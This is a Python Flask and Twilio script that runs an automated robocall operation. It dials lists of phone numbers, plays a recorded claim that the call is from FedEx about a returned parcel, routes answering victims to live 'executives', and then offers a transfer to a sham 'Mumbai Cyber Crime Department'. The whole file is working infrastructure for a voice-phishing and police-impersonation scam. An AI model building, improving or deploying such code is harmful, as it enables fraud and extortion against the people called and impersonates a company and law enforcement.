from flask import Flask, request, Response, render_template
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse, Gather, Dial
import firebase_admin
from firebase_admin import credentials, db
import time
import os
from dotenv import load_dotenv


load_dotenv()

# Initialize Firebase Admin

firebase_admin_sdk_key = {
    "type": os.getenv('FIREBASE_ADMIN_SDK_KEY_TYPE'),
    "project_id": os.getenv('FIREBASE_ADMIN_SDK_KEY_PROJECT_ID'),
    "private_key_id": os.getenv('FIREBASE_ADMIN_SDK_KEY_PRIVATE_KEY_ID'),
    "private_key": os.getenv('FIREBASE_ADMIN_SDK_KEY_PRIVATE_KEY').replace('\\n', '\n'),
    "client_email": os.getenv('FIREBASE_ADMIN_SDK_KEY_CLIENT_EMAIL'),
    "client_id": os.getenv('FIREBASE_ADMIN_SDK_KEY_CLIENT_ID'),
    "auth_uri": os.getenv('FIREBASE_ADMIN_SDK_KEY_AUTH_URI'),
    "token_uri": os.getenv('FIREBASE_ADMIN_SDK_KEY_TOKEN_URI'),
    "auth_provider_x509_cert_url": os.getenv('FIREBASE_ADMIN_SDK_KEY_AUTH_PROVIDER'),
    "client_x509_cert_url": os.getenv('FIREBASE_ADMIN_SDK_KEY_CLIENT_URL'),
    "universe_domain": os.getenv('UNIVERSE_DOMAIN')
}

if not firebase_admin._apps:
    cred = credentials.Certificate(firebase_admin_sdk_key)
    firebase_admin.initialize_app(cred, {
        'databaseURL': os.getenv('FIREBASE_ADMIN_SDK_KEY_DATABASE_URL')
    })

app = Flask(__name__)

# Twilio Credentials
account_sid = os.getenv('TWILIO_SDK_SID')
auth_token = os.getenv('TWILIO_SDK_TOKEN')
client = Client(account_sid, auth_token)

# Firebase Refs
calllogs_ref = db.reference('/calllogs/')
executives_ref = db.reference('/cexecutives/')
customers_ref = db.reference('/customers/')
crimeexecutives_ref = db.reference('/crimeexecutives/')

# Messages
initial_message = 'This is calling from Fedex international courier service. Your parcel has been returned. Please press 1 for more information.'
hold_message = 'Please wait while we are transferring the call to FedEx international courier service.'
transfer_message = 'This call has been transferred to the Mumbai Cyber Crime Department.'

@app.route('/make-call', methods=['POST'])
def make_call():
    """Initiates call to all customer numbers."""
    customer_numbers = request.json.get('numbers', [])
    if not customer_numbers:
        return {'message': 'No customers to call'}, 200

    interval = 200
    for phone in customer_numbers:
        free_executive = find_free_executive()
        if not free_executive:
            time.sleep(0.5)
            interval += 500
            continue

        try:
            call = client.calls.create(
                url='https://a95b-27-7-5-16.ngrok-free.app/voice-response',
                to=phone,
                from_='+19045724924',
                status_callback='https://a95b-27-7-5-16.ngrok-free.app/call-status',
                status_callback_event=['completed', 'failed', 'busy', 'no-answer']
            )

            calllogs_ref.child(call.sid).set({
                'receiver': phone,
                'from': '+19045724924',
                'executive': free_executive,
                'status': 'ongoing',
            })

            mark_executive_busy(free_executive, True)

            time.sleep(interval / 1000)

            if interval > 200:
                interval -= 500
            if interval < 200:
                interval = 200

        except Exception as e:
            print(f'Error: {e}')

    customers_ref.delete()

    return {'message': 'Calls completed or ongoing'}, 200

@app.route('/call-status', methods=['POST'])
def call_status():
    """Updates the call status in Firebase."""
    call_sid = request.form.get('CallSid')
    call_status = request.form.get('CallStatus')
    
    if call_sid:
        if call_status == 'completed':
            calllogs_ref.child(call_sid).delete()
        else:
            calllogs_ref.child(call_sid).update({'status': call_status})

    return '', 200

@app.route('/voice-response', methods=['POST'])
def voice_response():
    """Handles the initial voice response and call forwarding."""
    response = VoiceResponse()
    gather = Gather(num_digits=1, action='/gather-response', method='POST', timeout=15)
    gather.say(initial_message)
    response.append(gather)

    response.say('No input received. Goodbye.')
    response.hangup()

    return Response(str(response), mimetype='text/xml')

@app.route('/gather-response', methods=['POST'])
def gather_response():
    """Handles customer's input and forwards to an executive."""
    digits = request.form.get('Digits')
    response = VoiceResponse()

    if digits == '1':
        response.say(hold_message)
        free_executive = find_free_executive()
        if free_executive:
            dial = Dial(action='/cont')
            dial.number(free_executive)
            response.append(dial)
            response.play('https://firebasestorage.googleapis.com/v0/b/chicken-stew.appspot.com/o/627275__tyops__calm-and-sad-%5BAudioTrimmer.com%5D.wav?alt=media&token=9911d20b-1924-4d24-86c2-59f78d161d5e')
            response.say(hold_message)
        else:
            response.say('All customer care executives are busy. Please try again later.')

        response.hangup()
    else:
        response.say('Invalid input. Goodbye.')
        response.hangup()

    return Response(str(response), mimetype='text/xml')

@app.route('/cont', methods=['POST'])
def cont():
    """Prompts to transfer the call to Cyber Crime Department."""
    response = VoiceResponse()
    response.say("Press 7 to transfer this call to the Mumbai Cyber Crime Department.", voice='alice')
    gather = Gather(num_digits=1, action='/transfer-response', method='POST', timeout=10)
    response.append(gather)
    
    return Response(str(response), mimetype='text/xml')

@app.route('/transfer-response', methods=['POST'])
def transfer_response():
    """Handles the transfer to the Cyber Crime Department."""
    digits = request.form.get('Digits')
    response = VoiceResponse()

    if digits == '7':
        response.say(transfer_message)
        free_crime_exec = find_free_crime_executive()
        if free_crime_exec:
            response.dial(free_crime_exec)
        else:
            response.say('No available crime executives. Ending call.')
    else:
        response.say('No transfer detected. Staying on the line with customer care.')
    
    response.hangup()
    return Response(str(response), mimetype='text/xml')

def find_free_executive():
    """Finds and returns a free customer care executive."""
    executives = executives_ref.get()
    for exec_id, exec_data in executives.items():
        if not exec_data.get('busy'):
            return exec_data.get('phone')
    return None

def find_free_crime_executive():
    """Finds and returns a free crime executive."""
    crime_executives = crimeexecutives_ref.get()
    for exec_id, exec_data in crime_executives.items():
        if not exec_data.get('busy'):
            return exec_data.get('phone')
    return None

def mark_executive_busy(exec_phone, busy):
    """Updates the busy status of a customer care executive."""
    executives = executives_ref.get()
    for exec_id, exec_data in executives.items():
        if exec_data.get('phone') == exec_phone:
            executives_ref.child(exec_id).update({'busy': busy})
            break

if __name__ == '__main__':
    app.run(port=5000)
